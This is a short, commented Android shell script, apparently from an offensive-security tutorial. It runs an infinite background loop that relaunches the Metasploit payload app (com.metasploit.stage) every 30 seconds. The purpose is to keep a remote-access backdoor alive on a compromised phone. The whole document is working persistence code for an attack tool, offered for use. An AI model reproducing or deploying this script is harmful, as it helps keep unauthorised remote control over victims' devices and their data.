#### we will use "/system/bin/sh"  as our shell  because most android phones contain this type of shell
##we launch an android app using the command "am start -n package_name/launchable_activity_name"
#!/system/bin/sh
##create an infinite loop 
while [ 1 -gt 0 ]
do
##start the app
am start -n com.metasploit.stage/com.metasploit.stage.MainActivity
##sleep for 30 seconds
sleep 30
##finish 
done &
##the & is used to background the process